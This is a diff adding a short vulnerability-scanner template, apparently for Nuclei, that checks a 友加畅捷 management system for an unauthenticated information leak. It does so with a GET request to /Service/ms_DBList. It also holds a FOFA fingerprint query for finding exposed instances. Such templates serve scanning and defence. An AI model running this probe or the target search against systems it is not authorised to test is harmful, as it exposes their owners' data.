@@ -1,0 +1,19 @@
+id: poc-hcgkc5l7kn8704gk
+info:
+  name: 友加畅捷管理系统 Service ms_DBLis 未授权访问致信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hcgkc5l7kn8704gk'
+  tags: info-leak,unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hcgkc5l7kn8704gk
+    fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
+http:
+- raw:
+  - GET /Service/ms_DBList?a=789234 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
